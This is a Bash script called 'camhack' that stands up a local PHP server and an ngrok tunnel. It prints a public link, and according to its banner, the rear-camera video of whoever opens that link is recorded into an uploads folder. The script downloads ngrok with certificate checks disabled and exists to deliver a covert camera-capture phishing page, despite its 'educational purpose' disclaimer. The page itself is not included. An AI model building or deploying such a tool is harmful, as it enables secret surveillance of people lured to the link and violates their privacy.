#!/bin/bash
# camhack
# coded by: github.com/karthick01234/camhack
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {

printf "\e[1;92m    _ _ _ _    _ _ _ _    _ _ _ _ _ _ _ _ \e[0m\e[1;77m  _     _   _ _ _ _    _ _ _ _   _   __\e[0m\n"
printf "\e[1;92m   |  _ _ _|  |  _ _  |  |  _ _ _ _ _ _  |\e[0m\e[1;77m | |   | | |  _ _  |  |  _ _ _| | | / / \e[0m\n"
printf "\e[1;92m   | |        | |_ _| |  | |   | | |   | |\e[0m\e[1;77m | |_ _| | | |_ _| |  | |       | |/ /   \e[0m\n"
printf "\e[1;92m   | |        |  _ _  |  | |   | | |   | |\e[0m\e[1;77m |  _ _  | |  _ _  |  | |       |   |     \e[0m\n"
printf "\e[1;92m   | |_ _ _   | |   | |  | |   | | |   | |\e[0m\e[1;77m | |   | | | |   | |  | |_ _ _  | |\ \     \e[0m\n"
printf "\e[1;92m   |_ _ _ _|  |_|   |_|  |_|   |_|_|   |_|\e[0m         |_|   |_| |_|   |_|  |_ _ _ _| |_| \_\     \n"

printf " \e[1;77m v1.1 coded by github.com/karthick01234/camhack\e[0m \n"

printf "\n"
printf "\e[1;92m This tool is only for educational purpose\e[0m\n"
printf "\n"
printf "\e[1;92m Dont't use this tool for illegal activities\e[0m\n"
printf "\n"
printf "\e[1;92m recorded video are available in /sdcard/rearcamhack/uploads folder\e[0m\n"
printf "\n"
printf "\e[1;92m Don't delete rearcamhack folder in your sdcard\e[0m\n"
printf "\n"
printf "\n"
printf "\e[1;92m Besure turn on your hotspot before start the tool otherwise doesn't work \e[0m\n"
printf "\n"

server

}
server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 -t /sdcard/rearcamhack > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
printf "\n"
printf "\e[1;92m To stop this tool kill php and ngrok using below command \e[0m\n"
printf "\n"
printf "\e[1;92m killall php && killall ngrok \e[0m\n"
}
banner
